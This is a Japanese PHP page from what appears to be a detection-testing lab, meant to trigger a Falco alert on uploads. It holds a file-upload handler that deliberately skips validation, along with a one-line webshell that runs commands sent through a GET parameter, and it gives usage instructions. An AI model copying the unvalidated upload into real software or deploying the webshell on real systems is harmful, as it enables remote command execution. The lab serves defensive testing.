<!DOCTYPE html>
<html lang="ja">
<head><meta charset="UTF-8"><title>② ファイルアップロード</title>
<style>
body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 2rem; }
h1 { color: #e94560; }
pre { background: #0f3460; padding: 1rem; border-radius: 4px; white-space: pre-wrap; }
input[type=submit] { padding: 0.4rem 1rem; background: #e94560; color: white; border: none; cursor: pointer; margin-top: 0.5rem; }
.info { color: #888; font-size: 0.85rem; }
.success { color: #4caf50; }
.error { color: #e94560; }
a { color: #4fc3f7; }
</style>
</head>
<body>
<h1>② ファイルアップロード（Webshell設置）</h1>
<p class="info">
  アップロードされたファイルの拡張子チェックをしません。<code>.php</code> ファイルをアップロードすると実行できます。<br>
  <strong>VCDトリガー:</strong> /uploads/ 配下へのファイル書き込みを Falco が検知します。
</p>

<h3>Webshell をアップロードする</h3>
<form method="POST" enctype="multipart/form-data">
  <input type="file" name="file"><br>
  <input type="submit" value="アップロード">
</form>

<h3>テスト用 Webshell の内容:</h3>
<pre>&lt;?php system($_GET['c']); ?&gt;</pre>
<p class="info">上記を <code>shell.php</code> として保存してアップロード → <code>/uploads/shell.php?c=id</code> で実行</p>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $upload_dir = __DIR__ . '/uploads/';
    $filename   = basename($_FILES['file']['name']);
    $dest       = $upload_dir . $filename;

    // 意図的にバリデーションなし（検証専用）
    if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
        echo "<p class='success'>アップロード成功: <a href='uploads/" . htmlspecialchars($filename) . "'>/uploads/" . htmlspecialchars($filename) . "</a></p>";
    } else {
        echo "<p class='error'>アップロード失敗</p>";
    }
}
?>

<h3>アップロード済みファイル一覧:</h3>
<pre><?php
$files = glob(__DIR__ . '/uploads/*');
foreach ($files as $f) {
    $name = basename($f);
    echo htmlspecialchars($name) . "\n";
}
if (empty($files)) echo "(なし)";
?></pre>

<p><a href="index.php">← 戻る</a></p>
</body>
</html>
